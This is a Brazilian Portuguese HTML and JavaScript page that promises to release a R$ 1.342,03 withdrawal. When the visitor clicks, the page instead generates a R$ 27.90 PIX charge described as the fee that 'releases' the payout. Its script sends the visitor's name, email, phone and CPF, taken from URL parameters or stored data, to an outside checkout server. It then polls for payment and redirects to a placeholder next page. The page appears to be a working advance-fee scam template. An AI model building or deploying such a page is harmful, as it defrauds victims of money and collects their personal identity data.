<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;900&display=swap" rel="stylesheet">
<style>
    /* ESTILOS ORIGINAIS INTACTOS */
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
    .button-container { display: flex; justify-content: center; align-items: center; width: 100%; padding: 20px; }
    
    .btn-resgatar {
        background: #FF5F2C; color: white; border: none; width: 100%; max-width: 380px; 
        padding: 25px 20px; font-size: 22px; font-weight: 900; text-transform: uppercase;
        border-radius: 12px; cursor: pointer; box-shadow: 0 8px 0 #d1491f, 0 15px 20px rgba(0,0,0,0.2);
        transition: all 0.1s; position: relative; top: 0; animation: pulse-orange 2s infinite;
    }
    .btn-resgatar:active { top: 8px; box-shadow: 0 0 0 #d1491f, 0 0 0 rgba(0,0,0,0); }
    .btn-resgatar:disabled { background: #ccc; box-shadow: none; top: 0; animation: none; cursor: wait; }
    
    @keyframes pulse-orange {
        0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 95, 44, 0.7); }
        70% { transform: scale(1.02); box-shadow: 0 0 0 15px rgba(255, 95, 44, 0); }
        100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 95, 44, 0); }
    }

    /* Modal Original */
    .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 9998; backdrop-filter: blur(5px); }
    .modal-pix { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); z-index: 9999; text-align: center; width: 90%; max-width: 400px; }
    #qr_code_div img { margin: 20px auto; border-radius: 10px; max-width: 100%; border: 2px solid #eee; }
    .btn-copiar { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 50px; font-weight: 700; font-size: 16px; margin-top: 15px; cursor: pointer; }
</style>
</head>
<body>

<div class="button-container">
    <button id="btn_pagar" class="btn-resgatar" onclick="gerarPix()">
        RESGATAR R$ 1.342,03
    </button>
</div>

<div class="overlay" id="overlay"></div>
<div class="modal-pix" id="modal_pix">
    <h3 style="color:#333; margin-bottom:5px;">âœ… QR CODE GERADO</h3>
    <p style="color:#666; font-size:13px; margin-bottom:15px;">Finalize o pagamento para liberar seu saque.</p>
    <div id="qr_code_div"></div>
    <textarea id="txt_codigo" style="width:100%; height:60px; margin-top:10px; background:#f5f5f5; border:1px solid #ddd; border-radius:8px; padding:10px; font-size:12px; color:#555;" readonly>Gerando PIX...</textarea>
    <button class="btn-copiar" id="btn_copy" onclick="copiarCodigo()">COPIAR CÃ“DIGO PIX</button>
    
    <p id="status_msg" style="font-size: 12px; color: #888; margin-top: 15px;">
        Aguardando confirmaÃ§Ã£o do banco...
    </p>
</div>

<script>
    // ==========================================================
    // CONFIGURAÃ‡Ã•ES DO NOVO SERVIDOR
    // ==========================================================
    const API_URL = "https://checkoutfinal.onrender.com"; // Seu servidor atualizado
    const PROXIMA_ETAPA = "https://SEU_SITE.com/pagina-final"; // ðŸ”´ COLOQUE A PRÃ“XIMA PÃGINA AQUI

    function getURLParameter(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
    }

    function gerarPix() {
        const btn = document.getElementById("btn_pagar");
        btn.innerHTML = "PROCESSANDO...";
        btn.disabled = true;

        const urlNome = getURLParameter('nome');
        const urlEmail = getURLParameter('email');
        const urlPhone = getURLParameter('phone');
        const urlCpf = getURLParameter('cpf');

        const storedData = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');

        const finalNome = urlNome || storedData.nome || "Cliente Consumidor";
        const finalEmail = urlEmail || storedData.email || "cliente@pagamento.com";
        const finalPhone = urlPhone || storedData.telefone || "(11) 99999-9999";
        const finalCpf = urlCpf || storedData.documento || storedData.cpf || "00000000000";

        // CHAMA O SEU SERVIDOR NOVO
        fetch(`${API_URL}/pix`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                valor: "27.90", // Valor original mantido
                name: finalNome,
                email: finalEmail,
                phone: finalPhone,
                cpf: finalCpf
            })
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                // ABRE O SEU MODAL ORIGINAL
                document.getElementById("overlay").style.display = "block";
                document.getElementById("modal_pix").style.display = "block";
                
                // PREENCHE OS DADOS
                document.getElementById("txt_codigo").value = data.payload;

                // QR CODE Ã€ PROVA DE FALHAS (A mesma soluÃ§Ã£o que funcionou no index)
                const qrDiv = document.getElementById("qr_code_div");
                qrDiv.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.payload)}">`;

                // ==========================================================
                // ðŸ”´ MONITORAMENTO DO CAUÃŠ (PULA DE PÃGINA AUTOMATICAMENTE)
                // ==========================================================
                const monitoramento = setInterval(() => {
                    fetch(`${API_URL}/check-status/${data.transactionId}`)
                    .then(r => r.json())
                    .then(resStatus => {
                        if(resStatus.paid === true) {
                            clearInterval(monitoramento);
                            document.getElementById('status_msg').innerText = "ðŸš€ Pagamento aprovado! Liberando saque...";
                            document.getElementById('status_msg').style.color = "#28a745";
                            document.getElementById('status_msg').style.fontWeight = "bold";
                            
                            setTimeout(() => {
                                window.location.href = PROXIMA_ETAPA;
                            }, 1500);
                        }
                    })
                    .catch(err => console.log("Aguardando..."));
                }, 3000);

            } else {
                alert("Erro: " + (data.message || "Tente novamente."));
                btn.innerHTML = "RESGATAR R$ 1.342,03";
                btn.disabled = false;
            }
        })
        .catch(err => {
            console.error(err);
            alert("Erro de conexÃ£o.");
            btn.innerHTML = "RESGATAR R$ 1.342,03";
            btn.disabled = false;
        });
    }

    function copiarCodigo() {
        const copyText = document.getElementById("txt_codigo");
        copyText.select();
        copyText.setSelectionRange(0, 99999);
        navigator.clipboard.writeText(copyText.value);
        
        const btnCopy = document.getElementById('btn_copy');
        btnCopy.innerText = "âœ… CÃ“DIGO COPIADO!";
        btnCopy.style.background = "#1e7e34";
        
        setTimeout(() => {
            btnCopy.innerText = "COPIAR CÃ“DIGO PIX";
            btnCopy.style.background = "#28a745";
        }, 3000);
    }
</script>

</body>
</html>
